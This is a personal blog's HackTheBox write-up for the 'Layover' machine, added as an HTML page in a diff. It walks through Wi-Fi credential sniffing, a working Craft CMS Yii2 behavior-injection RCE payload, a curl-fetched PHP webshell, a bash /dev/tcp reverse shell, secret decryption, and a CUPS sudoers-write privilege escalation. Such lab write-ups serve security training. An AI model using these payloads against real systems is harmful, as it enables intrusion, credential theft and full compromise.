@@ -1,0 +1,428 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Layover HTB Writeup - WiFi Sniffing, Craft CMS RCE, CUPS LPE | BitR1FT</title>
+  <meta name="description" content="HackTheBox Layover walkthrough: RDP jumpbox, open WiFi credential sniffing via tshark, Craft CMS 5.9.8 authenticated RCE via Yii2 behavior injection, CUPS CVE-2026-34990 privilege escalation to root.">
+  <meta name="keywords" content="Layover HTB, HackTheBox Layover, WiFi sniffing, Craft CMS RCE, CUPS LPE, CVE-2026-34990, Yii2 injection, wireless pentesting, HackTheBox writeup">
+  <meta name="author" content="Adeel Haider (BitR1FT)">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#0b0a0a">
+  <link rel="canonical" href="https://bitr1ft.github.io/layover.html">
+  <link rel="icon" href="bitr1ft.jpg">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="BitR1FT">
+  <meta property="og:title" content="Layover HTB Writeup - WiFi Sniffing, Craft CMS RCE, CUPS LPE | BitR1FT">
+  <meta property="og:description" content="HackTheBox Layover walkthrough: RDP jumpbox, open WiFi credential sniffing via tshark, Craft CMS 5.9.8 authenticated RCE via Yii2 behavior injection, CUPS CVE-2026-34990 privilege escalation to root.">
+  <meta property="og:url" content="https://bitr1ft.github.io/layover.html">
+  <meta property="og:image" content="https://bitr1ft.github.io/profile.jpg">
+  <meta property="article:published_time" content="2026-10-05">
+  <meta property="article:author" content="Adeel Haider">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Layover HTB Writeup - WiFi Sniffing, Craft CMS RCE, CUPS LPE | BitR1FT">
+  <meta name="twitter:description" content="HackTheBox Layover walkthrough: RDP jumpbox, open WiFi credential sniffing via tshark, Craft CMS 5.9.8 authenticated RCE via Yii2 behavior injection, CUPS CVE-2026-34990 privilege escalation to root.">
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Layover HTB Writeup - WiFi Sniffing, Craft CMS RCE, CUPS LPE | BitR1FT","description":"HackTheBox Layover walkthrough: RDP jumpbox, open WiFi credential sniffing via tshark, Craft CMS 5.9.8 authenticated RCE via Yii2 behavior injection, CUPS CVE-2026-34990 privilege escalation to root.","url":"https://bitr1ft.github.io/layover.html","datePublished":"2026-10-05","author":{"@type":"Person","name":"Adeel Haider","alternateName":"BitR1FT"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav>
+    <a href="index.html" class="nav-brand">BitR1FT<span class="cursor"></span></a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#experience">Experience</a>
+      <a href="projects.html">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="AdeelHaider.pdf" target="_blank">Resume</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg></button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu">
+    <a href="index.html#about">About</a>
+    <a href="index.html#experience">Experience</a>
+    <a href="projects.html">Projects</a>
+    <a href="blog.html">Writeups</a>
+    <a href="AdeelHaider.pdf" target="_blank">Resume</a>
+  </div>
+
+  <main style="padding-top:calc(var(--nav-height) + 1rem);">
+    <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+
+      <!-- Back Link -->
+      <a href="blog.html" class="blog-back">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+        Back to Writeups
+      </a>
+
+      <!-- Blog Header -->
+      <div class="blog-header">
+        <div class="blog-title-row">
+          <h1 class="blog-title">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: middle; margin-right: 0.5rem; color: #10b981;"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/></svg>
+            Layover
+          </h1>
+          <span class="badge badge-hard">Hard</span>
+        </div>
+        <div class="blog-os">OS: Linux</div>
+        <p class="blog-summary">
+          Connected via RDP to a jumpbox with wireless interfaces, sniffed open Wi-Fi traffic to capture cleartext credentials, exploited Craft CMS 5.9.8 authenticated RCE via Yii2 behavior injection, decrypted a service account password from the database, and escalated to root through a CUPS 2.4.16 local privilege escalation vulnerability (CVE-2026-34990).
+        </p>
+        <div class="blog-meta-row">
+          <div class="blog-meta-section">
+            <div class="vuln-label">Key Vulnerabilities</div>
+            <div class="tech-tags">
+              <span class="badge badge-destructive">Open Wi-Fi Credential Sniff</span>
+              <span class="badge badge-destructive">Craft CMS Auth RCE</span>
+              <span class="badge badge-destructive">CVE-2026-34990 (CUPS LPE)</span>
+              <span class="badge badge-destructive">Cleartext Credential Exposure</span>
+            </div>
+          </div>
+          <div class="blog-meta-section">
+            <div class="tools-label">Tools Used</div>
+            <div class="tech-tags">
+              <span class="badge badge-outline">nmap</span>
+              <span class="badge badge-outline">xfreerdp</span>
+              <span class="badge badge-outline">tshark</span>
+              <span class="badge badge-outline">nmcli</span>
+              <span class="badge badge-outline">curl</span>
+              <span class="badge badge-outline">netcat</span>
+              <span class="badge badge-outline">mysql</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <hr>
+
+      <!-- Writeup Body -->
+      <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+        <div class="prose">
+
+          <h2>Summary</h2>
+          <p>
+            Welcome to the walkthrough for <strong>Layover</strong>, a Hard-rated HackTheBox machine that chains together wireless network exploitation, web application compromise, and a Linux local privilege escalation into a deeply satisfying multi-pivot attack path. This box is unique in that the initial access doesn't start with the target itself — you RDP into a jumpbox with wireless interfaces, sniff credentials off an open Wi-Fi network, and work your way inward.
+          </p>
+          <p>
+            <strong>Attack Chain:</strong> RDP → Open Wi-Fi Credential Sniff → Craft CMS Authenticated RCE → Decrypt Service Account → SSH → CUPS LPE → Root
+          </p>
+
+          <h2>1. Initial Access (Jumpbox)</h2>
+          <h3>Port Scanning</h3>
+          <p>We begin with a full port scan against the target machine to identify available services.</p>
+          <pre><code>nmap -sC -sV -p- 10.129.122.25</code></pre>
+          <p><strong>Open Ports Discovered:</strong></p>
+          <table>
+            <thead>
+              <tr>
+                <th>Port</th>
+                <th>State</th>
+                <th>Service</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>22/tcp</code></td>
+                <td>open</td>
+                <td>ssh</td>
+              </tr>
+              <tr>
+                <td><code>3389/tcp</code></td>
+                <td>open</td>
+                <td>ms-wbt-server (RDP)</td>
+              </tr>
+            </tbody>
+          </table>
+          <p>SSH and RDP are the only exposed services. We're given RDP credentials to connect to the jumpbox.</p>
+
+          <h3>RDP Connection</h3>
+          <p>Connect to the jumpbox using the provided contractor credentials:</p>
+          <pre><code>xfreerdp /v:10.129.122.25 /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution</code></pre>
+
+          <h3>Enumeration on the Jumpbox</h3>
+          <p>Once inside, we check our identity and permissions:</p>
+          <pre><code>whoami
+id
+sudo -l</code></pre>
+          <p><strong>Output:</strong></p>
+          <pre><code>contractor
+uid=1001(contractor) gid=1001(contractor) groups=1001(contractor),27(sudo),111(netdev),121(wireshark)
+User contractor may run the following commands on airside-ws01:
+    (ALL : ALL) ALL</code></pre>
+          <p>Key observations: we have <code>sudo ALL</code>, membership in the <code>wireshark</code> group (packet capture), and the <code>netdev</code> group (network device management). This immediately suggests wireless network interaction.</p>
+
+          <h2>2. Wireless Pivot &amp; Credential Capture</h2>
+          <h3>Interface Discovery</h3>
+          <p>Enumerate available network interfaces:</p>
+          <pre><code>ip a
+iwconfig
+nmcli device</code></pre>
+          <p>Two virtual wireless interfaces are available: <code>wlan2</code> and <code>wlan3</code>. This is where the box gets interesting — we'll use one to connect to the network and the other in monitor mode to sniff traffic.</p>
+
+          <h3>Connect to the Open Passenger Network</h3>
+          <p>Scan for available Wi-Fi networks and connect:</p>
+          <pre><code>sudo nmcli device wifi list
+sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2
+ip a show wlan2</code></pre>
+          <p><strong>Output:</strong></p>
+          <pre><code>inet 10.13.37.182/24</code></pre>
+          <p>We're now on the internal passenger network at <code>10.13.37.182</code>.</p>
+
+          <h3>Monitor Mode &amp; Traffic Capture</h3>
+          <p>Put the second wireless interface into monitor mode on channel 6:</p>
+          <pre><code>sudo nmcli device set wlan3 managed no
+sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+sudo iw dev wlan3 set channel 6</code></pre>
+          <p>Start capturing traffic:</p>
+          <pre><code>sudo tshark -i wlan3 -w /tmp/wifi.pcap</code></pre>
+
+          <h3>Extract Cleartext Credentials</h3>
+          <p>After capturing for a few minutes, analyze the PCAP for HTTP POST requests containing login data:</p>
+          <pre><code>sudo tshark -r /tmp/wifi.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value</code></pre>
+          <p><strong>Output:</strong></p>
+          <pre><code>10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!</code></pre>
+          <p>The open Wi-Fi network has zero encryption — anyone on the same network can sniff cleartext HTTP credentials. We've captured credentials for <code>jenny:Fl1ghtDeck2026!</code>.</p>
+
+          <h2>3. Craft CMS Access</h2>
+          <p>Browse to <code>http://portal.international.htb/admin</code> and login with the captured credentials:</p>
+          <ul>
+            <li><strong>Username:</strong> <code>jenny</code></li>
+            <li><strong>Password:</strong> <code>Fl1ghtDeck2026!</code></li>
+          </ul>
+          <p>We land in the Craft CMS Control Panel as a Content Editor — a low-privileged account, but still authenticated. The CMS is running <strong>Craft CMS 5.9.8</strong>.</p>
+
+          <h2>4. Authenticated RCE (Yii2 Behavior Injection)</h2>
+          <p>Craft CMS 5.9.8 is vulnerable to authenticated Remote Code Execution via <code>AttributeTypecastBehavior</code> injection through the <code>element-search</code> endpoint — a patch bypass of earlier CVEs in the Yii2 framework layer.</p>
+
+          <h3>Confirm RCE (Time-Based)</h3>
+          <p>We use the browser developer console (on the dashboard) to inject a time-based payload confirming command execution:</p>
+          <pre><code>(async () => {
+  const csrf = window.Craft.csrfTokenValue;
+  const fire = (cmd) => {
+    const b = {
+      elementType: "craft\\elements\\Category",
+      siteId: 1,
+      search: "",
+      condition: {
+        class: "craft\\elements\\conditions\\ElementCondition",
+        elementType: "craft\\elements\\Category",
+        fieldLayouts: [{
+          "as rce": {
+            "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+            "__construct()": [{
+              attributeTypes: {
+                typecastBeforeSave: [
+                  "Psy\\Readline\\Hoa\\ConsoleProcessus",
+                  "execute"
+                ]
+              },
+              typecastBeforeSave: cmd
+            }]
+          },
+          "on *": "self::beforeSave"
+        }]
+      }
+    };
+    return fetch('/admin/actions/element-search/search', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'X-CSRF-Token': csrf
+      },
+      body: JSON.stringify(b)
+    }).then(r => r.text());
+  };
+  console.log(await fire("sleep 5"));
+})();</code></pre>
+          <p>The response takes approximately 5 seconds, confirming blind command execution on the server.</p>
+
+          <h2>5. Webshell &amp; Reverse Shell</h2>
+          <h3>Drop a Webshell</h3>
+          <p>On the jumpbox, host a simple PHP webshell:</p>
+          <pre><code>cat > /tmp/shell.php << 'EOF'
+&lt;?php system($_GET['cmd']); ?&gt;
+EOF
+
+cd /tmp && python3 -m http.server 8080</code></pre>
+          <p>Use the RCE to download the webshell onto the target:</p>
+          <pre><code>// In browser console, using fire() from above
+await fire("curl http://10.13.37.182:8080/shell.php --output /var/www/portal/web/assets/shell.php");</code></pre>
+          <p>Verify execution:</p>
+          <pre><code>curl -s "http://portal.international.htb/assets/shell.php?cmd=id"</code></pre>
+          <p><strong>Output:</strong></p>
+          <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+          <h3>Catch a Reverse Shell</h3>
+          <p>Set up a listener on the jumpbox:</p>
+          <pre><code>nc -lvnp 4444</code></pre>
+          <p>Trigger the reverse shell via the webshell:</p>
+          <pre><code>curl -s "http://portal.international.htb/assets/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/4444+0>%261'"</code></pre>
+          <p>Stabilize the shell:</p>
+          <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm</code></pre>
+
+          <h2>6. Extract Secrets &amp; Lateral Movement</h2>
+          <h3>Database Credentials</h3>
+          <p>Read the Craft CMS environment file:</p>
+          <pre><code>cat /var/www/portal/.env</code></pre>
+          <p><strong>Output:</strong></p>
+          <pre><code>CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+CRAFT_DB_DATABASE=craft</code></pre>
+
+          <h3>Dump Encrypted Credentials</h3>
+          <p>Query the settings table for stored secrets:</p>
+          <pre><code>mysql -u craftuser -pCraftDB_pw_2026 craft -e 'SELECT * FROM htbairways_settings'</code></pre>
+          <p><strong>Output:</strong></p>
+          <table>
+            <thead>
+              <tr>
+                <th>Key</th>
+                <th>Value</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>mailRelayUser</code></td>
+                <td><code>aporter</code></td>
+              </tr>
+              <tr>
+                <td><code>mailRelayPassword</code></td>
+                <td><em>(base64 encrypted blob)</em></td>
+              </tr>
+            </tbody>
+          </table>
+
+          <h3>Decrypt the Service Account Password</h3>
+          <p>Using the Craft security key and Yii2's built-in decryption:</p>
+          <pre><code>php -r '
+require "/var/www/portal/vendor/autoload.php";
+$s = new yii\base\Security();
+echo $s->decryptByKey(
+  base64_decode("u0E7Ogb...Nl5w="),
+  "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"
+), "\n";
+'</code></pre>
+          <p><strong>Decrypted password:</strong></p>
+          <pre><code>Ap0rt3r_M@il_2026!</code></pre>
+
+          <h2>7. User Flag (SSH as aporter)</h2>
+          <p>SSH into the target with the decrypted service account credentials:</p>
+          <pre><code>ssh aporter@10.13.37.10
+# Password: Ap0rt3r_M@il_2026!</code></pre>
+          <pre><code>cat ~/user.txt</code></pre>
+          <p><strong>User flag captured.</strong></p>
+
+          <h2>8. Privilege Escalation (CUPS 2.4.16 — CVE-2026-34990)</h2>
+          <p>CUPS 2.4.16 is running on the target and is vulnerable to a local privilege escalation via Authorization token disclosure combined with file overwrite.</p>
+
+          <h3>The Attack</h3>
+          <p>The exploit works in three phases:</p>
+          <ol>
+            <li><strong>Token Leak:</strong> Create a local IPP printer pointing to a rogue listener. When CUPS connects, it sends its internal <code>Local</code> authorization token in the request headers.</li>
+            <li><strong>Admin Printer Creation:</strong> Using the stolen token, create a <code>file://</code> queue pointing at sensitive system files (e.g., <code>/etc/sudoers.d/</code>).</li>
+            <li><strong>File Write:</strong> Print a payload (sudoers fragment granting NOPASSWD root) into the file path, bypassing normal filesystem permissions.</li>
+          </ol>
+
+          <h3>Running the Exploit</h3>
+          <pre><code># As aporter on the target
+python3 cups_lpe.py</code></pre>
+          <p><strong>Output:</strong></p>
+          <pre><code>[+] Local token: &lt;captured token&gt;
+[*] step 1: write sudoers fragment
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+[*] sudo -n id -> rc_ok=True :: uid=0(root) gid=0(root) groups=0(root)
+[+] ROOT via sudoers</code></pre>
+          <p>The exploit writes <code>aporter ALL=(ALL) NOPASSWD: ALL</code> to <code>/etc/sudoers.d/aporter-pwn</code>, granting passwordless root access.</p>
+
+          <h3>Root Flag</h3>
+          <pre><code>sudo -i
+cat /root/root.txt</code></pre>
+          <p><strong>Root flag captured. Machine solved.</strong></p>
+
+          <h2>Summary &amp; Key Takeaways</h2>
+          <p><strong>The Attack Chain:</strong></p>
+          <blockquote>
+            <p>
+              RDP to Jumpbox (contractor credentials)<br>
+              ↓<br>
+              Open Wi-Fi sniffing via monitor mode (cleartext HTTP POST → <code>jenny:Fl1ghtDeck2026!</code>)<br>
+              ↓<br>
+              Craft CMS 5.9.8 Authenticated RCE (Yii2 behavior injection → www-data)<br>
+              ↓<br>
+              Database secret extraction + Yii2 decryption → <code>aporter:Ap0rt3r_M@il_2026!</code><br>
+              ↓<br>
+              SSH as aporter → user flag<br>
+              ↓<br>
+              CUPS 2.4.16 CVE-2026-34990 → sudoers write → root
+            </p>
+          </blockquote>
+          <p>
+            Layover is a masterclass in chained exploitation. The wireless pivot is particularly creative — demonstrating that open Wi-Fi networks in corporate environments are essentially broadcast mediums for credential theft. The Craft CMS RCE leverages Yii2 framework internals through deserialization-adjacent behavior injection, and the CUPS LPE exploits a trust boundary issue where the print service's internal auth token can be intercepted via a crafted printer backend.
+          </p>
+          <p>
+            Key defensive takeaways: never run captive portals over unencrypted HTTP, rotate CMS secrets regularly, and keep CUPS updated on production servers. Enterprise Wi-Fi should always use WPA2/3-Enterprise with RADIUS — never open networks with captive portals.
+          </p>
+          <p>Thanks for reading another write-up by <strong>BitR1FT</strong>. Keep chaining those pivots, and happy hacking!</p>
+
+          <p class="end-mark">&mdash; EOF &mdash;</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-contact">
+        <a href="mailto:adeelhaider304@gmail.com">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          adeelhaider304@gmail.com
+        </a>
+        <span class="sep"></span>
+        <span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+          0330-6869777
+        </span>
+        <span class="sep"></span>
+        <span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
+          Islamabad, Pakistan
+        </span>
+        <span class="sep"></span>
+        <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+          BitR1FT
+        </a>
+        <span class="sep"></span>
+        <a href="https://www.linkedin.com/in/4deel/" target="_blank" rel="noopener noreferrer">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect width="4" height="12" x="2" y="9"/><circle cx="4" cy="4" r="2"/></svg>
+          4deel
+        </a>
+      </div>
+      <div class="footer-bottom">
+        <p class="footer-left">&copy; 2026 <span class="accent">BitR1FT</span> — Adeel Haider</p>
+        <p class="footer-right">
+          <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
+          Built with passion &amp; caffeine
+          <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
+          <span class="accent">pwn all the things</span>
+        </p>
+      </div>
+    </div>
+  </footer>
+  <script src="main.js" defer></script>
+
+</body>
+</html>
